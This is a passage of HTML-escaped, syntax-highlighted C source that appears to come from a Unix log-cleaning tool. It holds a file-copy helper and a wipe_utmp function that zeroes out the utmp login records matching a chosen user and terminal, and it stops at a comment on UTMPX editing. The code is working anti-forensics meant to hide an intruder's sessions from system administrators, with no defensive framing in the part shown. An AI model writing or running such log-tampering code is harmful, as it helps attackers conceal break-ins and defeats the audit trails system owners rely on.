&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;copy_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; 	&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BUFFSIZE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_RDONLY&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Opening %s during copy.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;src&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_WRONLY&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_CREAT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_TRUNC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Creating %s during copy.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;BUFFSIZE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Write error during copy.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Read error during copy.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * UTMP editing.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;wipe_utmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; 		&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;utmp&lt;/span&gt;	&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Patching %s .... &amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UTMP_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;fflush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stdout&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Open the utmp file.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;UTMP_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;O_RDWR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;nf&#34;&gt;fprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;ERROR: Opening %s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;UTMP_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 * Copy utmp file excluding relevent entries. 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;	 */&lt;/span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;read&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strncmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;who&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			  &lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;strncmp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut_line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;line&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;bzero&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;lseek&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;SEEK_CUR&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ut&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fd1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Done.&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt; * UTMPX editing if supported.
